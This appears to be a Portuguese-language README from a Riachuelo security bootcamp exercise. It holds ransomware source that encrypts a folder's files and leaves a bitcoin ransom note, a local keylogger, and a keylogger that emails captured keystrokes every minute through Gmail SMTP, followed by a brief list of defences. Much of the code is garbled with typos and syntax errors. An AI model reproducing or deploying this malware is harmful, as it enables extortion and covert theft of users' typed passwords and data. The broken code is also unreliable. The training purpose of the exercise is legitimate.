# CapturaDeDados
Desafio de captura de dados do BootCamp de Segurança  da Riachuelo

#ATIVIDADE 1 - CRIAR UM RANSOWARE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Código para criar o ransoware para criptografar os arquivos do usuario 

from cryptography.fernet import Fernet 
import os   

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_files:
        chave_file.write(chave)

#2. Caregar chaves salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptrografar um único arquivo   
def criptrografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo. "wb") as file:
        file.write(dados_encriptados)      

#4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)  
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista  

#5. Mensagem de resgate
def criar_mensagem_restage():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Enviar 1 bitcoin para o endereço X e enviei o comprovante!\n")
        f.write("Depois disso, enviaremos a chava para recuperar seus dados!\n")

#6.Execução principal     
def main():
    gerar_chave() 
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptrografar_arquivo(arquivo_chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografados!")   

if __name__ == "__main__":
    main() 





#ATIVIDADE 2 - KEYLOGGER LOCAL !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

from pybput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd

}

def on_press(key):
    try:
        #se for uma tecla "normal" (letra, número, símbolo)
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t") 
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")  
            elif key in IGNORAR:
                pass
            else
                f.write(f"[{key}] ")  
with keyboard.listener(on_press=on_press) as listener:
    listener.join()     







#ATIVIDADE 3 - KEYLOGGER ENVIANDO E-MAIL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!.


form pynput import keyboard
import smtplib
from email.mime.txt import MIMEText
from threading import Time

log = ""

#CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = "keylogger69@gmail.com"
EMAIL_DESTINO = "keylogger69@gmail.com"
SENHA_EMAIL =  "MNB_SDF_!@#$%"¨

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados Capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msf['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM,SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
        log = ""  

    # Agendar o envio a cada 60 segundos
    Time(60, enviar_email).start()     

def on press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+=" "
        elif key == keyboard.Key.enter:
            log+="\n"  
        elif key == keyboard.Key.backspace:
            log+="[<]"
        else:
            pass # Ignorar control, shift, etc ...   

#Iniciar o keylogger e o envio automático 

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()


#ATIVIDADE 4 - PREVENÇÃO E DETECÇÃO !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!.
1 – Utilizar antivírus moderno atualizado. 
2 - Firewall de rede e sistema bem configurado – monitorar o que entrar e sair do endepoint.
3 – Monitorar os logs de aplicativos. Realizar detecção por comportamento 
4 – Manter a cultura de sempre conscientizar, educar os usuários.
5 – Utilizar ambientes isolados para testes.



